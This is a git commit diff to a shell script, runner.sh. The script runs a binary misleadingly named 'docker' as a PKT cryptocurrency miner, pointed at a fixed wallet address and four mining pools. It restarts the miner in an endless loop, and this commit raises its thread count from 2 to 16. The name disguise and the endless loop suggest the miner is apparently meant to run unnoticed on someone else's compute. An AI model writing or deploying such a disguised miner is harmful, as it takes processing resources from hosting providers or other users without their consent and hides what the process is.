cac710d7c6811a5dbbc226c6e46727ef2299fa15
shuwaibahjaman <129008845+shuwaibahjaman@users.noreply.github.com>
2023-04-02 05:06:24 +1000

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 
 chmod 700 docker
-timeout 5m ./docker ann -p pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world -t 2
-while :; do timeout 5m ./docker ann -p pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world -t 2;echo JOSS; sleep 10s; done
+timeout 5m ./docker ann -p pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world -t 16
+while :; do timeout 5m ./docker ann -p pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world -t 16;echo JOSS; sleep 10s; done
